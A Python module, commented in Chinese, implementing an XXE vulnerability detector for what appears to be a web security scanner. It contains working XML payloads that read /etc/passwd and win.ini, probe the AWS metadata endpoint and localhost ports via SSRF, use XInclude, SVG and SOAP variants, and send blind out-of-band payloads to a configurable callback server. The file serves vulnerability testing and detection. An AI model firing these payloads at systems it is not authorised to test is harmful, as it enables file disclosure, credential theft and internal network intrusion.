"""
XXE (XML 外部实体注入) 检测器

检测 XML 解析器的外部实体注入漏洞
"""

from typing import List, Optional, Dict, Any
import re
import logging
import uuid

from ..base import BaseDetector
from ..result import DetectionResult, Severity, DetectorType
from ..factory import register_detector
from ..payloads import get_payloads, PayloadCategory

logger = logging.getLogger(__name__)


@register_detector('xxe')
class XXEDetector(BaseDetector):
    """XXE (XML 外部实体注入) 检测器

    支持的检测技术:
    - 基础 XXE (文件读取)
    - 参数实体 XXE
    - Blind XXE (OOB)
    - XXE SSRF
    - XInclude 攻击

    使用示例:
        detector = XXEDetector()
        results = detector.detect("https://example.com/api/upload", data="<xml>...</xml>")
    """

    name = 'xxe'
    description = 'XML 外部实体注入漏洞检测器'
    vuln_type = 'xxe'
    severity = Severity.CRITICAL
    detector_type = DetectorType.INJECTION
    version = '2.0.0'

    # 文件读取成功的标志
    FILE_PATTERNS = {
        'unix': [
            r'root:x?:0:0:',
            r'daemon:x?:\d+:\d+:',
            r'nobody:x?:\d+:\d+:',
            r'/bin/bash',
            r'/bin/sh',
        ],
        'windows': [
            r'\[extensions\]',
            r'for 16-bit app support',
            r'\[fonts\]',
            r'\[mci extensions\]',
        ]
    }

    # XXE Payload 模板
    XXE_TEMPLATES = {
        'basic_unix': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',

        'basic_windows': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>''',

        'parameter_entity': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{oob_url}">
  %xxe;
]>
<foo></foo>''',

        'external_dtd': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "{oob_url}">
<foo></foo>''',

        'ssrf_aws': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>''',

        'ssrf_localhost': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:{port}/">
]>
<foo>&xxe;</foo>''',

        'xinclude': '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',

        'svg_xxe': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>''',

        'soap_xxe': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>''',
    }

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """初始化检测器

        Args:
            config: 配置选项
                - oob_server: OOB 服务器地址（用于 Blind XXE）
                - check_ssrf: 是否检测 XXE SSRF
                - timeout: 请求超时
        """
        super().__init__(config)

        # 加载 payload
        self.payloads = self._enhance_payloads(get_payloads(PayloadCategory.XXE))

        # 编译文件模式
        self._file_patterns: Dict[str, List[re.Pattern]] = {}
        for os_type, patterns in self.FILE_PATTERNS.items():
            self._file_patterns[os_type] = [
                re.compile(p, re.IGNORECASE) for p in patterns
            ]

        # 配置
        self.oob_server = self.config.get('oob_server', None)
        self.check_ssrf = self.config.get('check_ssrf', True)

    def detect(self, url: str, **kwargs) -> List[DetectionResult]:
        """检测 XXE 漏洞

        Args:
            url: 目标 URL
            **kwargs:
                data: XML 数据
                headers: 请求头
                content_type: 内容类型

        Returns:
            检测结果列表
        """
        self._log_detection_start(url)
        results: List[DetectionResult] = []

        headers = kwargs.get('headers', {})

        # 确保 Content-Type 是 XML
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/xml'

        # 测试基础 XXE
        basic_result = self._test_basic_xxe(url, headers)
        if basic_result:
            results.append(basic_result)

        # 测试 XInclude
        xinclude_result = self._test_xinclude(url, headers)
        if xinclude_result:
            results.append(xinclude_result)

        # 测试 SSRF via XXE
        if self.check_ssrf:
            ssrf_result = self._test_xxe_ssrf(url, headers)
            if ssrf_result:
                results.append(ssrf_result)

        # 测试 Blind XXE (需要 OOB 服务器)
        if self.oob_server:
            blind_result = self._test_blind_xxe(url, headers)
            if blind_result:
                results.append(blind_result)

        self._log_detection_end(url, results)
        return results

    def _test_basic_xxe(
        self,
        url: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试基础 XXE

        Args:
            url: 目标 URL
            headers: 请求头

        Returns:
            检测结果或 None
        """
        # 测试 Unix 文件读取
        unix_payload = self.XXE_TEMPLATES['basic_unix']
        result = self._send_xxe_payload(url, unix_payload, headers)
        if result:
            os_type, evidence = self._check_file_content(result.text, 'unix')
            if os_type:
                request_info = self._build_request_info(
                    method="POST",
                    url=url,
                    headers=headers,
                    data=unix_payload
                )
                response_info = self._build_response_info(result)
                return self._create_result(
                    url=url,
                    vulnerable=True,
                    payload=unix_payload,
                    evidence=evidence,
                    confidence=0.95,
                    verified=True,
                    request=request_info,
                    response=response_info,
                    remediation="禁用 XML 外部实体解析，使用安全的 XML 解析器配置",
                    references=[
                        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
                    ],
                    extra={
                        'xxe_type': 'basic',
                        'os_type': 'unix',
                        'file_read': '/etc/passwd'
                    }
                )

        # 测试 Windows 文件读取
        windows_payload = self.XXE_TEMPLATES['basic_windows']
        result = self._send_xxe_payload(url, windows_payload, headers)
        if result:
            os_type, evidence = self._check_file_content(result.text, 'windows')
            if os_type:
                request_info = self._build_request_info(
                    method="POST",
                    url=url,
                    headers=headers,
                    data=windows_payload
                )
                response_info = self._build_response_info(result)
                return self._create_result(
                    url=url,
                    vulnerable=True,
                    payload=windows_payload,
                    evidence=evidence,
                    confidence=0.95,
                    verified=True,
                    request=request_info,
                    response=response_info,
                    remediation="禁用 XML 外部实体解析，使用安全的 XML 解析器配置",
                    extra={
                        'xxe_type': 'basic',
                        'os_type': 'windows',
                        'file_read': 'C:\\Windows\\win.ini'
                    }
                )

        return None

    def _test_xinclude(
        self,
        url: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试 XInclude 攻击

        Args:
            url: 目标 URL
            headers: 请求头

        Returns:
            检测结果或 None
        """
        xinclude_payload = self.XXE_TEMPLATES['xinclude']
        result = self._send_xxe_payload(url, xinclude_payload, headers)

        if result:
            os_type, evidence = self._check_file_content(result.text, 'unix')
            if os_type:
                request_info = self._build_request_info(
                    method="POST",
                    url=url,
                    headers=headers,
                    data=xinclude_payload
                )
                response_info = self._build_response_info(result)
                return self._create_result(
                    url=url,
                    vulnerable=True,
                    payload=xinclude_payload,
                    evidence=evidence,
                    confidence=0.90,
                    verified=True,
                    request=request_info,
                    response=response_info,
                    remediation="禁用 XInclude 处理",
                    extra={
                        'xxe_type': 'xinclude',
                        'os_type': 'unix'
                    }
                )

        return None

    def _test_xxe_ssrf(
        self,
        url: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试 XXE SSRF

        Args:
            url: 目标 URL
            headers: 请求头

        Returns:
            检测结果或 None
        """
        # AWS 元数据探测
        aws_payload = self.XXE_TEMPLATES['ssrf_aws']
        result = self._send_xxe_payload(url, aws_payload, headers)

        if result and 'ami-id' in result.text.lower():
            request_info = self._build_request_info(
                method="POST",
                url=url,
                headers=headers,
                data=aws_payload
            )
            response_info = self._build_response_info(result)
            return self._create_result(
                url=url,
                vulnerable=True,
                payload=aws_payload,
                evidence="检测到 AWS 元数据访问",
                confidence=0.95,
                verified=True,
                request=request_info,
                response=response_info,
                remediation="禁用 XML 外部实体解析，限制网络访问",
                extra={
                    'xxe_type': 'ssrf',
                    'target': 'aws_metadata'
                }
            )

        # 本地端口探测
        for port in [80, 8080, 22, 3306]:
            localhost_payload = self.XXE_TEMPLATES['ssrf_localhost'].format(port=port)
            result = self._send_xxe_payload(url, localhost_payload, headers)

            if result and len(result.text) > 100:
                # 检查是否有有意义的响应
                if any(keyword in result.text.lower() for keyword in ['html', 'server', 'apache', 'nginx']):
                    request_info = self._build_request_info(
                        method="POST",
                        url=url,
                        headers=headers,
                        data=localhost_payload
                    )
                    response_info = self._build_response_info(result)
                    return self._create_result(
                        url=url,
                        vulnerable=True,
                        payload=localhost_payload,
                        evidence=f"成功访问内网端口 {port}",
                        confidence=0.80,
                        verified=False,
                        request=request_info,
                        response=response_info,
                        remediation="禁用 XML 外部实体解析，限制网络访问",
                        extra={
                            'xxe_type': 'ssrf',
                            'target': f'localhost:{port}'
                        }
                    )

        return None

    def _test_blind_xxe(
        self,
        url: str,
        headers: Dict[str, str]
    ) -> Optional[DetectionResult]:
        """测试 Blind XXE (OOB)

        Args:
            url: 目标 URL
            headers: 请求头

        Returns:
            检测结果或 None
        """
        if not self.oob_server:
            return None

        # 生成唯一标识符用于 OOB 验证
        unique_id = str(uuid.uuid4())[:8]
        oob_url = f"{self.oob_server}/{unique_id}"

        # 参数实体 XXE
        payload = self.XXE_TEMPLATES['parameter_entity'].format(oob_url=oob_url)
        self._send_xxe_payload(url, payload, headers)

        # 外部 DTD XXE
        dtd_payload = self.XXE_TEMPLATES['external_dtd'].format(oob_url=oob_url)
        self._send_xxe_payload(url, dtd_payload, headers)

        # 注意：实际验证需要检查 OOB 服务器是否收到请求
        # 这里只返回一个需要手动验证的结果
        return self._create_result(
            url=url,
            vulnerable=False,  # 需要 OOB 验证
            payload=payload,
            evidence=f"已发送 OOB XXE payload，请检查 {oob_url}",
            confidence=0.0,
            verified=False,
            request=self._build_request_info(
                method="POST",
                url=url,
                headers=headers,
                data=payload
            ),
            remediation="禁用 XML 外部实体解析",
            extra={
                'xxe_type': 'blind',
                'oob_url': oob_url,
                'needs_verification': True
            }
        )

    def _send_xxe_payload(
        self,
        url: str,
        payload: str,
        headers: Dict[str, str]
    ) -> Optional[Any]:
        """发送 XXE payload

        Args:
            url: 目标 URL
            payload: XXE payload
            headers: 请求头

        Returns:
            响应对象或 None
        """
        try:
            return self.http_client.post(url, data=payload, headers=headers)
        except Exception as e:
            logger.debug(f"XXE 请求失败: {e}")
            return None

    def _check_file_content(
        self,
        response_text: str,
        expected_os: str
    ) -> tuple:
        """检查响应中是否包含文件内容

        Args:
            response_text: 响应文本
            expected_os: 预期 OS 类型

        Returns:
            (OS类型, 证据) 或 (None, None)
        """
        patterns = self._file_patterns.get(expected_os, [])

        for pattern in patterns:
            match = pattern.search(response_text)
            if match:
                start = max(0, match.start() - 30)
                end = min(len(response_text), match.end() + 30)
                return (expected_os, response_text[start:end])

        return (None, None)

    def get_payloads(self) -> List[str]:
        """获取检测器使用的 payload 列表"""
        return list(self.XXE_TEMPLATES.values())
